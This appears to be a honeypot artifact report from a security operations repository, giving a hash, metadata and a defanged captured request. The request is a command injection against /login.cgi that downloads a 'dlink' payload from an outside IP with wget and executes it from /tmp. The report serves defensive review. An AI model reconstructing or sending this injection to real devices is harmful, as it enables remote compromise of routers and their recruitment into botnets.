# 5aff41058326118b0bd97d48a51c5940a090b5ad0af0b909c0e96b7171c585b6

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `5aff41058326118b0bd97d48a51c5940a090b5ad0af0b909c0e96b7171c585b6` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
GET /login.cgi?cli=aa%20aa%27;wget%20hxxp://140[.]233[.]190[.]XXX/dlink%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$ HTTP/1[.]1
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
